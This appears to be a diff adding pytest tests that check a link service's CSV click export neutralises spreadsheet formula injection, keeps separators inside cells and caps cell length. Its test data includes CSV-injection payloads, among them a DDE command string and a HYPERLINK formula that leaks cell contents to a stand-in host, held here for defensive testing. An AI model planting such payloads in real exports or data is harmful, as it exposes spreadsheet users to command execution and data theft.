@@ -1,0 +1,105 @@
+HOSTILE_VALUES = (
+    "=cmd|' /C calc'!A0",
+    "+SUM(1+1)",
+    "-2+3",
+    "@SUM(1+1)",
+    "\t=1+1",
+    "\r=1+1",
+    ' =HYPERLINK("https://evil.example/?x="&A1,"click")',
+    "\uff1d1+1",
+    "\u200b=1+1",
+)
+FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")
+
+
+@pytest.mark.parametrize("value", HOSTILE_VALUES)
+def test_hostile_referrers_are_neutralised_in_the_export(
+    shared: SharedApp, link_code: str, value: str
+) -> None:
+    """A referrer cell that a spreadsheet could evaluate is prefixed with a single quote.
+
+    Covers: @@COVERS@@
+    """
+    record_clicks(shared, link_code, 0, value)
+    rows = rows_of(export(shared, link_code, 1))
+    assert rows[-1][3] == "'" + value
+    assert len(rows) == 2
+    assert not [cell for row in rows for cell in row if cell.startswith(FORMULA_STARTS)]
+
+
+def test_benign_referrers_are_left_untouched(shared: SharedApp, link_code: str) -> None:
+    """Ordinary referrer origins are exported exactly as stored.
+
+    Covers: @@COVERS@@
+    """
+    record_clicks(shared, link_code, 0, "https://benign.example")
+    assert rows_of(export(shared, link_code, 1))[-1][3] == "https://benign.example"
+
+
+def test_a_link_code_that_looks_like_a_formula_is_neutralised(shared: SharedApp) -> None:
+    """Aliases may start with a minus sign: the code column is neutralised as well.
+
+    Covers: @@COVERS@@
+    """
+    code = make_link(shared, alias="-2-3")
+    response = export(shared, code, 1)
+    assert [row[0] for row in rows_of(response)[1:]] == ["'-2-3"]
+    assert response.headers["content-disposition"] == 'attachment; filename="clicks--2-3-1d.csv"'
+
+
+def test_separators_and_line_breaks_cannot_add_cells_or_rows(
+    shared: SharedApp, link_code: str
+) -> None:
+    """Commas, quotes and newlines inside a value stay inside one quoted cell.
+
+    Covers: @@COVERS@@
+    """
+    value = 'x,"y"\n=1+1,z'
+    record_clicks(shared, link_code, 0, value)
+    rows = rows_of(export(shared, link_code, 1))
+    assert len(rows) == 2
+    assert all(len(row) == 4 for row in rows)
+    assert rows[-1][3] == value
+
+
+def test_oversized_cells_are_capped(shared: SharedApp, link_code: str) -> None:
+    """A poisoned row cannot blow up the response: cells are length-capped.
+
+    Covers: @@COVERS@@
+    """
+    record_clicks(shared, link_code, 0, "=" + "A" * 5000)
+    cell = rows_of(export(shared, link_code, 1))[-1][3]
+    assert cell.startswith("'=")
+    assert len(cell) <= csv_export.MAX_CELL_CHARS + 1
+
+
+@pytest.mark.parametrize(
+    ("value", "expected"),
+    [
+        ("=1+1", "'=1+1"),
+        ("+1", "'+1"),
+        ("-1", "'-1"),
+        ("@A1", "'@A1"),
+        ("\tx", "'\tx"),
+        ("\rx", "'\rx"),
+        ("  =1+1", "'  =1+1"),
+        ("\n=1+1", "'\n=1+1"),
+        ("\uff1d1+1", "'\uff1d1+1"),
+        ("\uff0b1", "'\uff0b1"),
+        ("\u200b@A1", "'\u200b@A1"),
+        ("", ""),
+        ("   ", "   "),
+        ("0", "0"),
+        ("https://example.com", "https://example.com"),
+        ("a=b", "a=b"),
+        ("x-y", "x-y"),
+        ("x\t=1", "x\t=1"),
+        ("'=1+1", "'=1+1"),
+    ],
+)
+def test_cell_neutralisation_rules(value: str, expected: str) -> None:
+    """Only cells that start (after invisible lead-in) with a formula trigger are prefixed.
+
+    Covers: @@COVERS@@
+    """
+    assert csv_export.neutralize_cell(value) == expected
